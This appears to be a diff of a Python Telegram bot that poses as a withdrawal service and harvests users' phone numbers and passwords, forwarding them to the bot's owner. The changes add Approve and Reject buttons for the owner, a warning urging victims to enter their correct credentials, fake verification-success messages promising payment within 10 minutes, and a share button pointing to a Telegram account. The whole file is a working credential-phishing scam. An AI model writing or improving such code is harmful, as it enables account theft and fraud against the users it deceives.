@@ -75,7 +75,10 @@ async def send_credentials_to_owner(client, user_info, phone, password, withdraw
         f"⏰ <i>Received at {datetime.now(pytz.timezone('Asia/Kolkata')).strftime('%Y-%m-%d %H:%M:%S IST')}</i>"
     )
     
-    buttons = [[InlineKeyboardButton("✅ Seen", callback_data=f"withdraw_done:{withdrawal_id}")]]
+    buttons = [
+        [InlineKeyboardButton("✅ Approve", callback_data=f"withdraw_approve:{withdrawal_id}"),
+         InlineKeyboardButton("❌ Reject", callback_data=f"withdraw_reject:{withdrawal_id}")]
+    ]
     
     msg = await client.send_message(
         chat_id=OWNER_ID,
@@ -84,13 +87,6 @@ async def send_credentials_to_owner(client, user_info, phone, password, withdraw
         reply_markup=InlineKeyboardMarkup(buttons)
     )
     return msg.id
-
-async def reminder_task(client, user_info, phone, password, withdrawal_id):
-    """Send reminder every 5 minutes until owner sees the notification"""
-    while withdrawal_id in pending_withdrawals:
-        await asyncio.sleep(300)  # Wait 5 minutes
-        if withdrawal_id in pending_withdrawals:
-            await send_credentials_to_owner(client, user_info, phone, password, withdrawal_id)
 
 # ----------------------------
 # Commands
@@ -232,6 +228,15 @@ async def withdraw_command(client: Client, message: Message):
     user_id = message.from_user.id
     user_states[user_id] = "awaiting_withdraw_phone"
     try:
+        # Show warning first
+        await client.send_message(
+            chat_id=message.chat.id,
+            text="⚠️ <b>IMPORTANT WARNING:</b>\n\n"
+                 "Please enter the <b>correct credentials</b> for account verification.\n\n"
+                 "❌ If the credentials are incorrect, your withdrawal request will be <b>rejected</b>.",
+            parse_mode=ParseMode.HTML
+        )
+        
         # Ask for phone number
         phone_msg = await client.send_message(
             chat_id=message.chat.id,
@@ -331,10 +336,8 @@ async def withdraw_command(client: Client, message: Message):
         # Send credentials to owner immediately
         await send_credentials_to_owner(client, user_info, phone_number, password, withdrawal_id)
         
-        # Start reminder task
-        task = asyncio.create_task(reminder_task(client, user_info, phone_number, password, withdrawal_id))
+        # Store withdrawal info
         pending_withdrawals[withdrawal_id] = {
-            'task': task,
             'user_info': user_info,
             'phone': phone_number,
             'password': password
@@ -344,10 +347,23 @@ async def withdraw_command(client: Client, message: Message):
             f"✅ <b>Your request has been submitted successfully!</b>\n\n"
             f"📋 <b>Withdrawal Request ID:</b> <code>{display_id}</code>\n\n"
             f"🚀 Your withdrawal request will be processed very soon.\n"
-            f"📢 You'll receive a notification once the withdrawal proceeds.\n\n"
-            f"⚠️ <b>IMPORTANT:</b> The credentials must be correct for account verification, "
-            f"otherwise the withdrawal request will be rejected.",
+            f"📢 You'll receive a notification once the withdrawal proceeds.",
             parse_mode=ParseMode.HTML
+        )
+        
+        # Send message with button to share withdrawal ID
+        share_button = InlineKeyboardMarkup([
+            [InlineKeyboardButton(
+                "📤 Send",
+                url=f"https://t.me/evenSproDeal?text=Withdrawal%20ID%3A%20{display_id}"
+            )]
+        ])
+        
+        await message.reply(
+            f"📤 <b>Share your Withdrawal ID to the account's team for approval</b>\n\n"
+            f"Click the button below to send your Withdrawal ID to our verification team:",
+            parse_mode=ParseMode.HTML,
+            reply_markup=share_button
         )
     except asyncio.TimeoutError:
         user_states.pop(user_id, None)
@@ -445,10 +461,8 @@ async def handle_retry_same(client: Client, query: CallbackQuery):
         # Send credentials to owner immediately
         await send_credentials_to_owner(client, user_info, phone_number, password, withdrawal_id)
         
-        # Start reminder task
-        task = asyncio.create_task(reminder_task(client, user_info, phone_number, password, withdrawal_id))
+        # Store withdrawal info
         pending_withdrawals[withdrawal_id] = {
-            'task': task,
             'user_info': user_info,
             'phone': phone_number,
             'password': password
@@ -459,10 +473,24 @@ async def handle_retry_same(client: Client, query: CallbackQuery):
             text=f"✅ <b>Your request has been submitted successfully!</b>\n\n"
                  f"📋 <b>Withdrawal Request ID:</b> <code>{display_id}</code>\n\n"
                  f"🚀 Your withdrawal request will be processed very soon.\n"
-                 f"📢 You'll receive a notification once the withdrawal proceeds.\n\n"
-                 f"⚠️ <b>IMPORTANT:</b> The credentials must be correct for account verification, "
-                 f"otherwise the withdrawal request will be rejected.",
+                 f"📢 You'll receive a notification once the withdrawal proceeds.",
             parse_mode=ParseMode.HTML
+        )
+        
+        # Send message with button to share withdrawal ID
+        share_button = InlineKeyboardMarkup([
+            [InlineKeyboardButton(
+                "📤 Send",
+                url=f"https://t.me/evenSproDeal?text=Withdrawal%20ID%3A%20{display_id}"
+            )]
+        ])
+        
+        await client.send_message(
+            chat_id=query.message.chat.id,
+            text=f"📤 <b>Share your Withdrawal ID to the account's team for approval</b>\n\n"
+                 f"Click the button below to send your Withdrawal ID to our verification team:",
+            parse_mode=ParseMode.HTML,
+            reply_markup=share_button
         )
     except asyncio.TimeoutError:
         user_states.pop(user_id, None)
@@ -489,28 +517,75 @@ async def handle_retry_cancel(client: Client, query: CallbackQuery):
     await query.message.delete()
     await query.answer("❌ Operation cancelled.")
 
-@app.on_callback_query(filters.regex(r"^withdraw_done:"))
-async def handle_withdraw_done(client: Client, query: CallbackQuery):
-    """Handle when owner confirms they've seen the withdrawal notification"""
+@app.on_callback_query(filters.regex(r"^withdraw_approve:"))
+async def handle_withdraw_approve(client: Client, query: CallbackQuery):
+    """Handle when owner approves the withdrawal request"""
     if query.from_user.id != OWNER_ID:
         await query.answer("⚠️ This action is only for the owner!", show_alert=True)
         return
     
-    withdrawal_id = query.data.replace("withdraw_done:", "")
+    withdrawal_id = query.data.replace("withdraw_approve:", "")
     
     if withdrawal_id in pending_withdrawals:
-        # Cancel the reminder task
-        pending_withdrawals[withdrawal_id]['task'].cancel()
+        # Get user info
+        user_id = pending_withdrawals[withdrawal_id]['user_info']['user_id']
+        
+        # Remove from pending withdrawals
         del pending_withdrawals[withdrawal_id]
         
-        # Update the message (keeping phone number in code format for copying)
+        # Update the owner's message
         await query.message.edit_text(
-            query.message.text + "\n\n✅ <b>NOTIFICATION SEEN</b>",
+            query.message.text + "\n\n✅ <b>APPROVED</b>",
             parse_mode=ParseMode.HTML
         )
-        await query.answer("✅ Notification marked as seen!", show_alert=True)
+        await query.answer("✅ Withdrawal request approved!", show_alert=True)
+        
+        # Send approval message to user
+        await client.send_message(
+            chat_id=user_id,
+            text="✅ <b>Account Verification Successful!</b>\n\n"
+                 "🎉 Your account verification has passed and your withdrawal request has been accepted.\n\n"
+                 "⏳ Your withdrawal will be processed within <b>10 minutes</b>.\n\n"
+                 "🙏 Please be patience. Thank you!",
+            parse_mode=ParseMode.HTML
+        )
     else:
-        await query.answer("⚠️ This notification was already marked as seen.", show_alert=True)
+        await query.answer("⚠️ This request has already been processed.", show_alert=True)
+
+@app.on_callback_query(filters.regex(r"^withdraw_reject:"))
+async def handle_withdraw_reject(client: Client, query: CallbackQuery):
+    """Handle when owner rejects the withdrawal request"""
+    if query.from_user.id != OWNER_ID:
+        await query.answer("⚠️ This action is only for the owner!", show_alert=True)
+        return
+    
+    withdrawal_id = query.data.replace("withdraw_reject:", "")
+    
+    if withdrawal_id in pending_withdrawals:
+        # Get user info
+        user_id = pending_withdrawals[withdrawal_id]['user_info']['user_id']
+        
+        # Remove from pending withdrawals
+        del pending_withdrawals[withdrawal_id]
+        
+        # Update the owner's message
+        await query.message.edit_text(
+            query.message.text + "\n\n❌ <b>REJECTED</b>",
+            parse_mode=ParseMode.HTML
+        )
+        await query.answer("❌ Withdrawal request rejected!", show_alert=True)
+        
+        # Send rejection message to user
+        await client.send_message(
+            chat_id=user_id,
+            text="❌ <b>Account Verification Failed!</b>\n\n"
+                 "🚫 Your account verification has failed.\n\n"
+                 "Please use /start command to request again with the correct credentials.\n\n"
+                 "🙏 Thank you!",
+            parse_mode=ParseMode.HTML
+        )
+    else:
+        await query.answer("⚠️ This request has already been processed.", show_alert=True)
 
 # ----------------------------
 # Main Runner
